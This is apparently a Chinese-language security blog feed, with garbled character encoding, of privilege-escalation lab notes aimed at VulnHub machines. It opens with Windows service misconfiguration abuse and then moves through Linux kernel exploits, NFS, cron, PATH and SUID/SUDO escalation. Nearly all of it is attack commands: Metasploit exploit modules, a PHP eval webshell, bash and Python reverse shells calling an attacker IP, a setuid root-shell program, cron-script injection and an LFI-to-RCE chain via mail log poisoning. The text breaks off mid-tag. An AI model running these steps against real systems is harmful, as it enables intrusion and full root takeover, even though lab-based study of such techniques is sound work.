title="Win2012-ä¸å®‰å…¨çš„æœåŠ¡æƒé™é…åˆMSF-NewServices"></a>Win2012-ä¸å®‰å…¨çš„æœåŠ¡æƒé™é…åˆMSF-NewServices</h3><p>åŸç†ï¼šå³ä½¿æ­£ç¡®å¼•ç”¨äº†æœåŠ¡è·¯å¾„ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨å…¶ä»–æ¼æ´ã€‚ç”±äºç®¡ç†é…ç½®é”™è¯¯ï¼Œç”¨æˆ·å¯èƒ½å¯¹æœåŠ¡æ‹¥æœ‰è¿‡å¤šçš„æƒé™ï¼Œä¾‹å¦‚ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹å®ƒå¯¼è‡´é‡å®šå‘æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>è¿‡ç¨‹ï¼šæ£€æµ‹æœåŠ¡æƒé™é…ç½®-åˆ¶ä½œæ–‡ä»¶å¹¶ä¸Šä¼ -æ›´æ”¹æœåŠ¡è·¯å¾„æŒ‡å‘-è°ƒç”¨åæˆåŠŸ</p><p>æ£€æµ‹è„šæœ¬ï¼šaccesschk.exe -uwcqv â€œadministratorâ€ *</p><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p><p>ä¿®æ”¹testæœåŠ¡æŒ‡å‘Program.exe</p><p>sc config â€œtestâ€ binpath&#x3D; â€œC:\Program.exeâ€</p><p>sc start test</p><p>å®æˆ˜ä¸­åŸºæœ¬æ²¡æœ‰ï¼Œwebshellæ²¡æœ‰æƒé™æ‰§è¡Œé‚£ä¸ªå·¥å…·ï¼Œéœ€è¦é«˜æƒé™</p><h3 id="ç»¼åˆç±»æ£€æµ‹é¡¹ç›®ï¼š"><a href="#ç»¼åˆç±»æ£€æµ‹é¡¹ç›®ï¼š" class="headerlink" title="ç»¼åˆç±»æ£€æµ‹é¡¹ç›®ï¼š"></a>ç»¼åˆç±»æ£€æµ‹é¡¹ç›®ï¼š</h3><p><a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p><p>ç±»ä¼¼å¯¹æ•´æœºè¿›è¡ŒåŸºçº¿æ£€æŸ¥</p><p>PEAS-ngé€‚ç”¨äºWindowså’ŒLinux&#x2F;Unix*å’ŒMacOSçš„æƒé™æå‡å·¥å…·ã€‚</p><p>winPEAS.bat &gt; result.txt</p><p>winPEASany.exe log&#x3D;result.txt</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> æƒé™æå‡ </tag>
            
            <tag> å†…ç½‘ </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxæƒé™æå‡</title>
      <link href="/2024/09/17/%E5%86%85%E7%BD%91/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
      <url>/2024/09/17/%E5%86%85%E7%BD%91/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å½“å‰ä¸»æœºçš„æ“ä½œç³»ç»Ÿ</p><p>hostnamectl</p><p>cat &#x2F;etc&#x2F;*-release</p><p>lsb_release -a </p><p>cat &#x2F;etc&#x2F;lsb-release # Debain</p><p>cat &#x2F;etc&#x2F;redhat-release # Redhat</p><p>cat &#x2F;etc&#x2F;centos-release # Centos</p><p>cat &#x2F;etc&#x2F;os-release # Ubuntu</p><p>cat &#x2F;etc&#x2F;issue</p><p>å½“å‰ä¸»æœºçš„å†…æ ¸ç‰ˆæœ¬</p><p>hostnamectl</p><p>uname -a </p><p>cat &#x2F;proc&#x2F;version</p><p>dmesg | grep â€œLinux versionâ€</p><h2 id="å†…æ ¸æ¼æ´ç­›é€‰ï¼š"><a href="#å†…æ ¸æ¼æ´ç­›é€‰ï¼š" class="headerlink" title="å†…æ ¸æ¼æ´ç­›é€‰ï¼š"></a>å†…æ ¸æ¼æ´ç­›é€‰ï¼š</h2><p>ä¸‹é¢çš„msfæµ‹è¯•å‡åœ¨kaliä¸­è¿›è¡Œ</p><p>MSFæ£€æµ‹ï¼š</p><p>run post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</p><p>ææƒè„šæœ¬:</p><p>ç­›é€‰å¯èƒ½å­˜åœ¨ææƒæ¼æ´çš„ä¿¡æ¯ï¼Œä¸»è¦æ˜¯å†…æ ¸æ¼æ´ææƒ</p><p><a href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a></p><p><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a></p><p><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p><p><a href="https://github.com/belane/linux-soft-exploit-suggester">https://github.com/belane/linux-soft-exploit-suggester</a></p><p>ç»¼åˆè„šæœ¬:</p><p>åŒ…å«ä¸€äº›å…¶ä»–CVEï¼Œä½†å†…æ ¸æ¼æ´ææƒæ•ˆæœä¸å¦‚ä¸Šé¢</p><p><a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p><p><a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p><p><a href="https://github.com/redcode-labs/Bashark">https://github.com/redcode-labs/Bashark</a></p><p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><h2 id="web-linuxåº”ç”¨åœºæ™¯ï¼š"><a href="#web-linuxåº”ç”¨åœºæ™¯ï¼š" class="headerlink" title="web-linuxåº”ç”¨åœºæ™¯ï¼š"></a>web-linuxåº”ç”¨åœºæ™¯ï¼š</h2><p>è·å–åˆ°Webæƒé™åœ¨LinuxæœåŠ¡å™¨ä¸Šæ—¶è¿›è¡Œçš„å†…æ ¸æ¼æ´ææƒ</p><h3 id="å¸¸è§å†…æ ¸æ¼æ´æ¡ˆä¾‹ï¼š"><a href="#å¸¸è§å†…æ ¸æ¼æ´æ¡ˆä¾‹ï¼š" class="headerlink" title="å¸¸è§å†…æ ¸æ¼æ´æ¡ˆä¾‹ï¼š"></a>å¸¸è§å†…æ ¸æ¼æ´æ¡ˆä¾‹ï¼š</h3><p>dirtycowï¼ˆCVE-2016-5159ï¼‰</p><p>Pwnkit (CVE-2021-4034) </p><p>Dirty Pipeï¼ˆCVE-2022-0847)</p><p>SUDO ï¼ˆCVE-2021-3156ï¼‰</p><p>å¤§è„ç‰› (CVE-2017â€“1000405)</p><p>CVE-2017-16995</p><p>CVE-2021-3560</p><p>CVE-2023-1829 </p><p>CVE-2022-2588 </p><p>CVE-2021-3493</p><p>CVE-2022-32250</p><p>CVE-2023-3269</p><p>CVE-2022-0995</p><p>CVE-2022-2639</p><p>CVE-2023-0386</p><p>â€¦</p><h4 id="Web-å†…æ ¸æº¢å‡º-Dcow"><a href="#Web-å†…æ ¸æº¢å‡º-Dcow" class="headerlink" title="Web&amp;å†…æ ¸æº¢å‡º-Dcow"></a>Web&amp;å†…æ ¸æº¢å‡º-Dcow</h4><p>å¤ç°ç¯å¢ƒï¼š<a href="https://www.vulnhub.com/entry/lampiao-1,249/">https://www.vulnhub.com/entry/lampiao-1,249/</a></p><p>1ã€ä¿¡æ¯æ”¶é›†ï¼š</p><p>&#x2F;&#x2F;å…¨ç«¯å£æ‰«æ</p><p>nmap -p1-65535 192.168.139.0&#x2F;24</p><p>2ã€Webæ¼æ´åˆ©ç”¨ï¼š&#x2F;&#x2F;msf</p><p>search drupal</p><p>use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2</p><p>set rhost 192.168.46.144</p><p>set rport 1898</p><p>run</p><p>3ã€å†…æ ¸ææƒï¼š</p><p>upload &#x2F;root&#x2F;linux-exploit-suggester.sh &#x2F;tmp&#x2F;1.sh</p><p>shell</p><p>cd &#x2F;tmp</p><p>chmod +x 1.sh</p><p>.&#x2F;1.sh</p><p><a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p><p>upload &#x2F;root&#x2F;dcow.cpp &#x2F;tmp&#x2F;dcow.cpp</p><p>g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o dcow dcow.cpp -lutil      &#x2F;æœ‰å¯èƒ½ç¼–è¯‘ä¸äº†ï¼Œå¦‚æœç›®æ ‡æœºå™¨ä¸Šä¸èƒ½å˜å¼‚å°±åœ¨æ”»å‡»æœºç¼–è¯‘å®Œï¼Œç›´æ¥ä»æ”»å‡»æœºä¸Šä¼ ç¼–è¯‘å®Œçš„ </p><p>python -c â€˜import pty; pty.spawn(â€œ&#x2F;bin&#x2F;bashâ€)â€™</p><p>.&#x2F;dcow</p><p>su root</p><p>è¯¥æ¼æ´åªèƒ½åˆ©ç”¨ä¸€æ¬¡ï¼Œåšå®Œéœ€è¦è¿˜åŸ</p><h4 id="Web-å†…æ ¸æº¢å‡º-Pwnkit"><a href="#Web-å†…æ ¸æº¢å‡º-Pwnkit" class="headerlink" title="Web&amp;å†…æ ¸æº¢å‡º-Pwnkit"></a>Web&amp;å†…æ ¸æº¢å‡º-Pwnkit</h4><p>å¤ç°ç¯å¢ƒï¼š<a href="https://www.vulnhub.com/entry/darkhole-1,724/">https://www.vulnhub.com/entry/darkhole-1,724/</a></p><p>å…¥å£ç‚¹æ˜¯è¯¥ç½‘ç«™ä¿®æ”¹ç”¨æˆ·åæŠ“å–idå¯ä»¥ä¿®æ”¹ï¼Œåç™»å½•å‘ç°ä¸Šä¼ æ–‡ä»¶å¯ä»¥é€šè¿‡.phtmlç»•è¿‡ï¼Œæ‹¿åˆ°webshell</p><p>1ã€ä¿¡æ¯æ”¶é›†ï¼š</p><p>nmap -p1-65535 192.168.139.0&#x2F;24</p><p>2ã€Webæ¼æ´åˆ©ç”¨ï¼š</p><p>é‡ç½®ç®¡ç†å¯†ç -ä¸Šä¼ 1.phtml-åå¼¹MSFï¼Œå“¥æ–¯æ‹‰é‡Œé¢PMeterpreteræ¨¡å—å¯ä»¥åå¼¹åˆ°msfä¸Š</p><p>use exploit&#x2F;multi&#x2F;handler </p><p>set payload php&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set lhost 0.0.0.0</p><p>set lport 6666</p><p>run</p><p>3ã€å†…æ ¸ææƒ</p><p>upload &#x2F;root&#x2F;linux-exploit-suggester.sh &#x2F;tmp&#x2F;1.sh</p><p>shell</p><p>cd &#x2F;tmp</p><p>chmod +x 1.sh</p><p>.&#x2F;1.sh</p><p>search cve_2021_4034</p><p>use exploit&#x2F;linux&#x2F;local&#x2F;cve_2021_4034_pwnkit_lpe_pkexec</p><p>set session x</p><p>run</p><p>getuid</p><p>shell</p><p>cd &#x2F;root</p><p>cat root.txt</p><h4 id="Web-å†…æ ¸æº¢å‡º-DirtyPipe"><a href="#Web-å†…æ ¸æº¢å‡º-DirtyPipe" class="headerlink" title="Web&amp;å†…æ ¸æº¢å‡º-DirtyPipe"></a>Web&amp;å†…æ ¸æº¢å‡º-DirtyPipe</h4><p><a href="https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/">https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/</a></p><p>1ã€ä¿¡æ¯æ”¶é›†ï¼š</p><p>nmap -p1-65535 192.168.139.0&#x2F;24</p><p>2ã€Webæ¼æ´åˆ©ç”¨</p><p>æ‰«æå‘ç°-æŠ“åŒ…åˆ†æ-æ–‡ä»¶å†™å…¥-åå¼¹MSF</p><p>gobuster dir -u <a href="http://192.168.139.146/">http://192.168.139.146</a> -x php,bak,txt,html -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt</p><p>æ‰«åˆ°ä¸€ä¸ªphpæ–‡ä»¶ä¸ºæ¼æ´å…¥å£ï¼Œå¯ä»¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬æ‹¿åˆ°webshellï¼Œä¸‹é¢ä¸ºæŠ“åŒ…çš„æµé‡ï¼Œå¯ä»¥çœ‹åˆ°postä¼ å…¥çš„æ—¶å€™ä¹Ÿä¼šæ˜æ–‡æ˜¾ç¤ºæ–‡ä»¶å</p><p>message&#x3D;<?php eval($_POST["pass"]);?>&amp;file&#x3D;xd.php</p><p>å“¥æ–¯æ‹‰webshellè¿ä¸Šå»æ¥ç€ç”¨PMeterpreteræ¨¡å—æ‰“msf</p><p>use exploit&#x2F;multi&#x2F;handler </p><p>set payload php&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set lhost 0.0.0.0</p><p>set lport 6666</p><p>run</p><p>3ã€å†…æ ¸ææƒ</p><p>upload &#x2F;root&#x2F;linux-exploit-suggester.sh &#x2F;tmp&#x2F;1.sh</p><p>shell</p><p>cd &#x2F;tmp</p><p>chmod +x 1.sh</p><p>.&#x2F;1.sh   &#x2F;&#x2F;æ‰§è¡Œå®Œå‘ç°æœ‰cve_2022_0847å¯ä»¥åˆ©ç”¨</p><p>search cve_2022_0847</p><p>use exploit&#x2F;linux&#x2F;local&#x2F;cve_2022_0847_dirtypipe</p><p>set session x</p><p>set lhost xx.xx.xx.xx</p><p>run</p><h4 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h4><p>CVE-2023-0386</p><p><a href="https://mp.weixin.qq.com/s/Z6sVuMrYMZV8WD6z1-U95Q">https://mp.weixin.qq.com/s/Z6sVuMrYMZV8WD6z1-U95Q</a></p><h3 id="Web-ç”¨æˆ·-NFSå®‰å…¨"><a href="#Web-ç”¨æˆ·-NFSå®‰å…¨" class="headerlink" title="Web&amp;ç”¨æˆ·-NFSå®‰å…¨"></a>Web&amp;ç”¨æˆ·-NFSå®‰å…¨</h3><p>NFSæ˜¯ä¸€ç§åŸºäºTCP&#x2F;IP ä¼ è¾“çš„ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿåè®®ï¼Œé€šè¿‡ä½¿ç”¨NFSåè®®ï¼Œå®¢æˆ·æœºå¯ä»¥åƒè®¿é—®æœ¬åœ°ç›®å½•ä¸€æ ·è®¿é—®è¿œç¨‹æœåŠ¡å™¨ä¸­çš„å…±äº«èµ„æºã€‚</p><p><a href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a></p><p><a href="https://www.vulnhub.com/entry/hacksudo-2-hackdudo,667/">https://www.vulnhub.com/entry/hacksudo-2-hackdudo,667/</a></p><p>æå‡æ¡ä»¶ï¼šNFSæœåŠ¡å¼€å¯å’Œwebæˆ–ç”¨æˆ·æƒé™è¿›è¡Œåˆ©ç”¨</p><p>1ã€ä¿¡æ¯æ”¶é›†ï¼š</p><p>nmap 192.168.1.6</p><p><a href="http://192.168.1.6/file.php?file=/etc/passwd">http://192.168.1.6/file.php?file=/etc/passwd</a></p><p>2ã€NFSæœåŠ¡åˆ©ç”¨</p><p>showmount -e 192.168.1.6    é“¾æ¥</p><p>mkdir nfs</p><p>mount -t nfs 192.168.1.6:&#x2F;mnt&#x2F;nfs .&#x2F;nfs  æŠŠæ”»å‡»æœºçš„nfså’Œç›®æ ‡æœºå™¨çš„&#x2F;mnt&#x2F;nfsåŒæ­¥ï¼Œæ³¨æ„å¦‚æœä¸Šä¼ é©¬è¦ç»™æƒé™</p><p>chmod 777 shell.php</p><p>3ã€é…åˆSUIDææƒ</p><p>æ³¨æ„gccç¼–è¯‘æœºå™¨ä¸ç›®æ ‡æœºå†…æ ¸ç‰ˆæœ¬ç›¸ä¼¼</p><p>ç›´æ¥cpå¤åˆ¶æœºå™¨ä¸Šçš„suidæ–‡ä»¶ä¹Ÿå¯ä»¥ï¼Œæ”¹åå†ä¸Šä¼ </p><p>#include&lt;stdlib.h&gt;</p><p>#include&lt;unistd.h&gt;</p><p>int main()</p><p>{</p><p>setuid(0);</p><p>system(â€œidâ€);</p><p>system(â€œ&#x2F;bin&#x2F;bashâ€);</p><p>}</p><p>gcc getroot.c -o getroot</p><p>cp getroot &#x2F;root&#x2F;nfs #å¤åˆ¶bashåˆ°æŒ‚è½½ç›®å½•ä¸‹</p><p>chmod +s getroot #èµ‹äºˆsuidæƒé™</p><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null å†çœ‹çœ‹æ˜¯å¦åŠ å…¥</p><p>cd &#x2F;mnt&#x2F;nfs # ç›®æ ‡æœº</p><p>.&#x2F;getroot # ç›®æ ‡æœº</p><h3 id="Web-ç”¨æˆ·-Cronä»»åŠ¡"><a href="#Web-ç”¨æˆ·-Cronä»»åŠ¡" class="headerlink" title="Web&amp;ç”¨æˆ·-Cronä»»åŠ¡"></a>Web&amp;ç”¨æˆ·-Cronä»»åŠ¡</h3><p><a href="https://www.vulnhub.com/entry/jarbas-1,232/">https://www.vulnhub.com/entry/jarbas-1,232/</a></p><p>æå‡æ¡ä»¶ï¼šWebæˆ–ç”¨æˆ·æƒé™è¿›è¡ŒæŸ¥çœ‹ï¼Œä»»åŠ¡æ–‡ä»¶å¯ä¿®æ”¹</p><p>1ã€ä¿¡æ¯æ”¶é›†ï¼š</p><p><a href="http://192.168.139.152/access.html">http://192.168.139.152/access.html</a></p><p>2ã€æƒé™è·å–ï¼š</p><p><a href="http://192.168.139.152:8080/">http://192.168.139.152:8080/</a></p><p>Jenkinsåˆ›å»ºä»»åŠ¡ï¼Œæ·»åŠ åå¼¹ï¼Œç«‹å³æ„å»º</p><p>è¿™è¾¹æ·»åŠ çš„åå¼¹å¯èƒ½æ˜¯webç”¨æˆ·æˆ–è€…æ™®é€šç”¨æˆ·æƒé™ </p><p>3ã€æƒé™æå‡ï¼š</p><p>cat &#x2F;etc&#x2F;crontab</p><p>cat &#x2F;etc&#x2F;script&#x2F;CleaningScript.sh #æŸ¥çœ‹è„šæœ¬å†…å®¹</p><p>ls -lia &#x2F;etc&#x2F;script&#x2F;CleaningScript.sh #æŸ¥çœ‹å¯¹ä»»åŠ¡æ–‡ä»¶çš„æƒé™</p><p>echo â€œ&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.139.141&#x2F;66 0&gt;&amp;1â€ &gt;&gt; &#x2F;etc&#x2F;script&#x2F;CleaningScript.sh</p><h3 id="Linuxç³»ç»Ÿææƒ-Web-ç”¨æˆ·-PATHå˜é‡"><a href="#Linuxç³»ç»Ÿææƒ-Web-ç”¨æˆ·-PATHå˜é‡" class="headerlink" title="Linuxç³»ç»Ÿææƒ-Web&amp;ç”¨æˆ·-PATHå˜é‡"></a>Linuxç³»ç»Ÿææƒ-Web&amp;ç”¨æˆ·-PATHå˜é‡</h3><p><a href="https://www.vulnhub.com/entry/symfonos-1,322/">https://www.vulnhub.com/entry/symfonos-1,322/</a></p><p>æå‡æ¡ä»¶ï¼šå­˜åœ¨SUIDçš„åº”ç”¨ä¸­èƒ½å¯é€†å‘å‡ºæ‰§è¡Œå‘½ä»¤ï¼ŒåŠ ç”¨æˆ·æƒé™</p><p>ç›®æ ‡å¼€æ”¾445ç«¯å£ï¼Œåˆ¤æ–­æœ‰smbæœåŠ¡ </p><p>1ã€ä¿¡æ¯æ”¶é›†ï¼š</p><p>smbclient -L 192.168.139.153</p><p>2ã€æƒé™è·å–ï¼š</p><p>smbclient &#x2F;&#x2F;192.168.139.153&#x2F;anonymous</p><p>get attention.txt</p><p>smbclient &#x2F;&#x2F;192.168.139.153&#x2F;helios -U helios</p><p>helios \ qwerty</p><p>3ã€æ¼æ´åˆ©ç”¨&#x2F;&#x2F;ä»ä¸Šé¢å¯ä»¥å¾—åˆ°ä¸€ä¸ªwordpressç½‘ç«™ wpscan kaliè‡ªå¸¦</p><p>wpscan â€“url <a href="http://192.168.139.153/h3l105/">http://192.168.139.153/h3l105/</a> â€“plugins-detection aggressive</p><p>searchsploit mail masta 1.0   &#x2F;&#x2F;kaliè‡ªå¸¦æ¼æ´åº“</p><p><a href="http://192.168.139.153/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd">http://192.168.139.153/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</a></p><p>telnet 192.168.139.153 25</p><p>MAIL FROM: MALABIS</p><p>RCPT TO: helios</p><p>data</p><?php system($_GET['shell']); ?><p>.</p><p>QUIT</p><p><a href="http://192.168.139.153/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&shell=/bin/bash%20-i%20%3E&%20/dev/tcp/192.168.139.141/6666%200%3E&1">http://192.168.139.153/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;shell=/bin/bash%20-i%20%3E&amp;%20/dev/tcp/192.168.139.141/6666%200%3E&amp;1</a></p><p>python -c â€˜import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((â€œ192.168.139.128â€,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([â€œ&#x2F;bin&#x2F;shâ€,â€-iâ€]);â€™</p><p>4ã€æƒé™æå‡ï¼š</p><p>&#x2F;opt&#x2F;statuschecké‡Œæœ‰æ‰§è¡Œcurl</p><p>è‡ªå·±çš„æ–‡ä»¶è‡ªå·±èƒ½ä¿®æ”¹ï¼Œæ‰€ä»¥curlèƒ½chmod 777</p><p>python -c â€˜import pty;pty.spawn(â€œ&#x2F;bin&#x2F;bashâ€)â€™</p><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p>strings &#x2F;opt&#x2F;statuscheck</p><p>cd &#x2F;tmp</p><p>echo â€œ&#x2F;bin&#x2F;shâ€ &gt; curl</p><p>chmod 777 curl      </p><p>export PATH&#x3D;&#x2F;tmp:$PATH</p><p>echo $PATH</p><p>&#x2F;opt&#x2F;statuscheck</p><h3 id="SUID-SUDOåº”ç”¨åœºæ™¯ï¼š"><a href="#SUID-SUDOåº”ç”¨åœºæ™¯ï¼š" class="headerlink" title="SUID&amp;SUDOåº”ç”¨åœºæ™¯ï¼š"></a>SUID&amp;SUDOåº”ç”¨åœºæ™¯ï¼š</h3><p>è·å–åˆ°Webæƒé™æˆ–æ™®é€šç”¨æˆ·åœ¨LinuxæœåŠ¡å™¨ä¸Šæ—¶è¿›è¡Œçš„SUID&amp;SUDOææƒ</p><p>SUID (Set owner User ID up on execution)æ˜¯ç»™äºˆæ–‡ä»¶çš„ä¸€ä¸ªç‰¹æ®Šç±»å‹çš„æ–‡ä»¶æƒé™ã€‚åœ¨Linux&#x2F;Unixä¸­ï¼Œå½“ä¸€ä¸ªç¨‹åºè¿è¡Œçš„æ—¶å€™ï¼Œç¨‹åºå°†ä»ç™»å½•ç”¨æˆ·å¤„ç»§æ‰¿æƒé™ã€‚SUIDè¢«å®šä¹‰ä¸ºç»™äºˆä¸€ä¸ªç”¨æˆ·ä¸´æ—¶çš„ï¼ˆç¨‹åº&#x2F;æ–‡ä»¶ï¼‰æ‰€æœ‰è€…çš„æƒé™æ¥è¿è¡Œä¸€ä¸ªç¨‹åº&#x2F;æ–‡ä»¶ã€‚ç”¨æˆ·åœ¨æ‰§è¡Œç¨‹åº&#x2F;æ–‡ä»¶&#x2F;å‘½ä»¤çš„æ—¶å€™ï¼Œå°†è·å–æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™ä»¥åŠæ‰€æœ‰è€…çš„UIDå’ŒGIDã€‚</p><p>SUDOæƒé™æ˜¯rootæŠŠæœ¬æ¥åªèƒ½è¶…çº§ç”¨æˆ·æ‰§è¡Œçš„å‘½ä»¤èµ‹äºˆæ™®é€šç”¨æˆ·æ‰§è¡Œï¼Œç³»ç»Ÿç®¡ç†å‘˜é›†ä¸­çš„ç®¡ç†ç”¨æˆ·ä½¿ç”¨æƒé™å’Œä½¿ç”¨ä¸»æœºï¼Œé…ç½®æ–‡ä»¶ï¼š&#x2F;etc&#x2F;sudoersï¼Œé™¤æ­¤é…ç½®ä¹‹å¤–çš„é—®é¢˜ï¼ŒSUDOè¿˜æœ‰ä¸¤ä¸ªCVEæ¼æ´ï¼ˆCVE-2019-14287 CVE-2021-3156ï¼‰ã€‚</p><p>#åˆ©ç”¨å‚è€ƒï¼š</p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p>è¿™ä¸ªç½‘ç«™é‡Œé¢å¯ä»¥æ‰¾ä¸€ä¸‹å‚è€ƒ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724807930632-6551ba3c-b3e4-4460-b9c3-0e43d4ea9ca2.png"></p><h4 id="Web-ç”¨æˆ·-Suid"><a href="#Web-ç”¨æˆ·-Suid" class="headerlink" title="Web&amp;ç”¨æˆ·-Suid"></a>Web&amp;ç”¨æˆ·-Suid</h4><p>1ã€SUID&amp;GUID</p><p>ç¯å¢ƒï¼š<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p><p>å‘½ä»¤ï¼šSUID GUID</p><p>æŸ¥æ‰¾suidæ–‡ä»¶</p><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p>find &#x2F; -perm -g&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p>é¡¹ç›®ï¼šLinEnum PEASS-ng</p><p>egï¼šfind . &#x2F; -exec â€œwhoamiâ€;</p><p>&#x2F;usr&#x2F;bin&#x2F;find . -exec â€˜&#x2F;bin&#x2F;shâ€™ ;</p><p>find &#x2F; -name 123 -exec â€˜&#x2F;bin&#x2F;shâ€™ ;</p><p>&#x2F;usr&#x2F;bin&#x2F;sudo find &#x2F;flag -exec cat &#x2F;f* ;</p><p>2ã€SUID&amp;SUDO</p><p>ç¯å¢ƒï¼š<a href="https://www.vulnhub.com/entry/toppo-1,245/">https://www.vulnhub.com/entry/toppo-1,245/</a></p><p>æ­å»ºï¼šåˆ›å»ºä»»æ„è™šæ‹Ÿæœºï¼Œç„¶åå°†toppo.vmdxæ–‡ä»¶æ”¹åå¹¶æ›¿æ¢åŸæ¥çš„vmdxæ–‡ä»¶</p><p>SUIDï¼š</p><p>&#x2F;usr&#x2F;bin&#x2F;python2.7 -c â€˜import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((â€œ192.168.139.141â€,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([â€œ&#x2F;bin&#x2F;shâ€,â€-iâ€]);â€™</p><h4 id="Web-ç”¨æˆ·-Sudo-cve-ç”¨æˆ·æ˜¯å› ä¸ºgitè¿™ç§é¡¹ç›®éƒ¨ç½²çš„æ—¶å€™éœ€è¦æ™®é€šç”¨æˆ·æƒé™æ”¯æŒ"><a href="#Web-ç”¨æˆ·-Sudo-cve-ç”¨æˆ·æ˜¯å› ä¸ºgitè¿™ç§é¡¹ç›®éƒ¨ç½²çš„æ—¶å€™éœ€è¦æ™®é€šç”¨æˆ·æƒé™æ”¯æŒ" class="headerlink" title="Web&amp;ç”¨æˆ·-Sudo(cve)&#x2F;&#x2F;ç”¨æˆ·æ˜¯å› ä¸ºgitè¿™ç§é¡¹ç›®éƒ¨ç½²çš„æ—¶å€™éœ€è¦æ™®é€šç”¨æˆ·æƒé™æ”¯æŒ"></a>Web&amp;ç”¨æˆ·-Sudo(cve)&#x2F;&#x2F;ç”¨æˆ·æ˜¯å› ä¸ºgitè¿™ç§é¡¹ç›®éƒ¨ç½²çš„æ—¶å€™éœ€è¦æ™®é€šç”¨æˆ·æƒé™æ”¯æŒ</h4><p>1ã€SUDO</p><p>ç¯å¢ƒï¼š<a href="https://www.vulnhub.com/entry/toppo-1,245/">https://www.vulnhub.com/entry/toppo-1,245/</a></p><p>æ­å»ºï¼šåˆ›å»ºä»»æ„è™šæ‹Ÿæœºï¼Œç„¶åå°†toppo.vmdxæ–‡ä»¶æ”¹åå¹¶æ›¿æ¢åŸæ¥çš„vmdxæ–‡ä»¶</p><p>SUDO:</p><p>cat &#x2F;etc&#x2F;sudoers</p><p>&#x2F;usr&#x2F;bin&#x2F;awk â€˜BEGIN {system(â€œ&#x2F;bin&#x2F;shâ€)}â€™    &#x2F;&#x2F;åˆ©ç”¨sudoersé‡Œé¢çš„awkå»æ–°å¼€ä¸€ä¸ªrootæƒé™çš„sh</p><p>2ã€SUDO-CVE</p><p>ç¯å¢ƒï¼š<a href="https://www.vulnhub.com/entry/devguru-1,620/">https://www.vulnhub.com/entry/devguru-1,620/</a></p><p>-ä¿¡æ¯æ”¶é›†ï¼š</p><p>80ï¼Œ8585</p><p><a href="http://192.168.139.150/.git/">http://192.168.139.150/.git/</a></p><p><a href="http://192.168.139.150/adminer.php">http://192.168.139.150/adminer.php</a></p><p><a href="http://192.168.139.150/backend/backend/auth">http://192.168.139.150/backend/backend/auth</a></p><p><a href="http://192.168.139.150:8585/">http://192.168.139.150:8585/</a></p><p><a href="http://192.168.139.150:8585/admin">http://192.168.139.150:8585/admin</a></p><p>-gitæ³„æ¼(åˆ©ç”¨ç‚¹)</p><p>python GitHack.py <a 